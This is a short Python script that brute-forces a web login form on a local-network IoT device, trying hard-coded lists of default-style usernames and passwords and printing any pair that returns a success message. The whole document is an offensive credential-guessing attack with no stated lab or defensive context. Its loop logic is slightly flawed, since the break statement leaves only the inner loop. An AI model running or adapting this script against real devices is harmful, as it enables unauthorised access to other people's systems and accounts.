import time
import requests

url = "http://192.168.1.100/login"

# Wordlists
usernames = ["admin", "user", "iot", "test"]
passwords = ["1234", "admin", "password", "iot123", "123456"]

for user in usernames:
    for pwd in passwords:
        data = {
            "username": user,
            "password": pwd
        }

        try:
            response = requests.post(url, data=data)

            print(f"Trying {user}:{pwd} -> {response.status_code}")

            # If login successful (example condition)
            if "success" in response.text.lower():
                print(f"[SUCCESS] Username: {user}, Password: {pwd}")
                break

        except Exception as e:
            print("Error:", e)

        time.sleep(0.5)  # slow down slightly
